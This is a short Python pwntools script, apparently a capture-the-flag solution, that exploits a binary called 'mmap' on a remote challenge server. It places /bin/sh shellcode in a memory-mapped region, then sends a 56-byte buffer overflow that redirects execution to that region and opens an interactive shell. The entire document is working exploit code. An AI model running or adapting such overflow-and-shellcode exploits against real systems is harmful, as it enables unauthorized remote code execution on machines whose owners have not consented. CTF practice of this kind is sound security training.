from pwn import *

elf = context.binary = ELF("mmap")

#p = process("./mmap")
p=remote("pwn.sh4dy.com",5005)

for i in range(6):
    p.recvline()

p.sendline(flat("1"))
for i in range(2):
    p.recvline()

shellcode = asm(shellcraft.sh())
p.sendline(shellcode)

start_addr_mmap = 0x500000

for i in range(5):
    p.recvline()

p.sendline(flat("2"))
payload = b'a'*56 + p64(start_addr_mmap)
print(len(payload))
for i in range(2):
    p.recvline()
p.sendline(payload)
p.interactive()